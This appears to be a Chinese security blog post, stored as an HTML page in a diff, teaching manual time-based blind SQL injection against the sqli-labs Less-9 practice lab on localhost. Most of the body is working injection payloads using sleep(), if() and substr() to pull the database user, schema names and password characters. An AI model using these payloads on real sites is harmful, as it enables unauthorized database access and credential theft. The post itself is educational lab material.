@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>MySQL手注之延时盲注(基于时间的盲注) | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MySQL手注之延时盲注(基于时间的盲注)</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 18, 2020&nbsp;&nbsp;9:44:11</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="延时盲注简介"><a href="#延时盲注简介" class="headerlink" title="延时盲注简介"></a>延时盲注简介</h2><p>延时注入：部分网站没办法 <code>union select</code> 联合查询方式注入 、部分网站没有输出显示，只能通过延时判断；</p>
+<p>环境：<code>Sqli-tabs</code></p>
+<p>注入点：<code>http://127.0.0.1/sqli/Less-9/</code></p>
+<p>核心代码：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1565.png" alt="图片"></p>
+<p>也就是说：我们在查询的语句都会记录到 <code>result.txt</code> 这个文件里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1566.png" alt="图片"></p>
+<p>而且无论你输入什么，网站页面都会给你返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in...........</span><br></pre></td></tr></table></figure>
+
+<p>所以说我们不能用常规的联合查询注入或者说报错注入以及布尔盲注来进行SQL注入攻击，只能通过<code>时间注入</code>来进行SQL注入攻击！</p>
+<p>最主要的产生注入查询是这段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="延时注入函数"><a href="#延时注入函数" class="headerlink" title="延时注入函数"></a>延时注入函数</h3><p><code>IF</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：IF(Condition,A,B) </span><br><span class="line">含义：如果Condition条件成⽴，则执行语句A，否则执行语句B</span><br></pre></td></tr></table></figure>
+
+<p>还有很多函数如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr函数 </span><br><span class="line">ascii函数</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>mysql&gt;=5.0 使⽤sleep()进⾏查询 </p>
+</blockquote>
+<blockquote>
+<p>mysql&lt;5.0使⽤benchmark()进⾏查询 </p>
+</blockquote>
+<p><code>benchmark</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchmark是通过查询次数增多，时间变得缓慢来判断是否存在延迟</span><br><span class="line">select benchmark(1000,select * from admin);</span><br></pre></td></tr></table></figure>
+
+<h2 id="sleep函数进行时间盲注"><a href="#sleep函数进行时间盲注" class="headerlink" title="sleep函数进行时间盲注"></a>sleep函数进行时间盲注</h2><p>判断是否存在延迟注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1567.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1568.png" alt="图片"></p>
+<p>由上图可见，它响应了<code>6秒</code>，也其实差不多了（相差一秒）</p>
+<h3 id="判断当前用户"><a href="#判断当前用户" class="headerlink" title="判断当前用户"></a>判断当前用户</h3><p>上帝视角告诉你当前用户是：<code>root</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1569.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(ascii(substr(user(),1,1))=114,sleep(5),1) --+</span><br><span class="line">注释：</span><br><span class="line">判断user()用户的第一个字符是否为Ascii码的114，如果是那么延时5秒</span><br><span class="line">114的Ascii码是r</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),1,1))=114,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1570.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字符是否为：o</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),2,1))=111,sleep(5),1) --+</span><br><span class="line">猜解第三个字符是否为：o</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),3,1))=111,sleep(5),1) --+</span><br><span class="line">猜解第四个字符是否为：t</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),4,1))=116,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>我就不一一截图了，只截图最后一张：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1571.png" alt="图片"></p>
+<p>这样就可以判断出当前用户是 <code>root </code></p>
+<h3 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h3><p>上帝视角告诉你当前数据库名为：<code>security</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1572.png" alt="图片"></p>
+<p>首先判断数据库名的长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=8,sleep(5),1) --+</span><br><span class="line">注释：</span><br><span class="line">如果数据库长度为：8，则延时5秒</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1573.png" alt="图片"></p>
+<p>逐字猜解数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),2,1))=101,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：c</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),3,1))=99,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),4,1))=117,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：r</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),5,1))=114,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：i</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),6,1))=105,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：t</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),7,1))=116,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：y</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),8,1))=121,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>由于语句太多，我就不一一截图了，我就截图最后一张：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(database(),8,1))=121,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1574.png" alt="图片"></p>
+<p>这样就猜解出来它当前的数据库名为：<code>security</code></p>
+<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>上帝视角告诉你表名有：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1575.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个表名的第一个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=101,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">想要查询第二个表名，就把 LIMIT 0，1 修改为：LIMIT 1,1 以此类推！</span><br><span class="line">想要查询第二个字符：就吧LIMIT 0,1),1,1 修改为：LIMIT 0,1),2,1 以此类推！</span><br></pre></td></tr></table></figure>
+
+<p>查询 <code>users</code> 表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第四个表名的第一个字符是否为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),1,1))=117,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第二个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),2,1))=115,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第三个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),3,1))=101,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第四个字符是否为：r</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),4,1))=114,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第五个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),5,1))=115,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>这里我就截图最后一张了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1576.png" alt="图片"></p>
+<p>这样就得到了 <code>users</code> 这个表名！</p>
+<h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><p>上帝视角告诉你 <code>users</code> 的列名有：<code>id</code>、<code>username</code>、<code>password</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1577.png" alt="图片"></p>
+<p>查询 <code>id</code> 列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询 users 表名下的第一个列名的第一个字段：i</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1) --+</span><br><span class="line">查询 users 表名下的第一个列名的第二个字段：d</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),2,1))=100,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>查询 <code>username</code> 列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">查询 users 表名下第二个列名的第一个字段：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1,1))=117,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第二个字段：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),2,1))=115,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第三个字段：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),3,1))=101,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第四个字段：r</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),4,1))=114,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第五个字段：n</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),5,1))=110,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第六个字段：a</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),6,1))=97,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第七个字段：m</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),7,1))=109,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第八个字段：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),8,1))=101,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>如果有多个列的话就以此类推~</p>
+<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>上帝视角：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1578.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解 password 第一个字符为：D</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),1,1))=68,sleep(5),1) --+</span><br><span class="line">猜解 password 第二个字符为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),2,1))=117,sleep(5),1) --+</span><br><span class="line">猜解 password 第三个字符为：m</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),3,1))=109,sleep(5),1) --+</span><br><span class="line">猜解 password 第四个字符为：b</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),4,1))=98,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1579.png" alt="图片"></p>
+<p>这样就猜解出数据了！后面的以此类推!</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/04/18/MySQL-4/">http://example.com/2020/04/18/MySQL-4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MySQL/"># MySQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/22/HackTheBox-Magic/">HackTheBox-Magic-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/18/MySQL-3/">MySQL手注之布尔型盲注</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
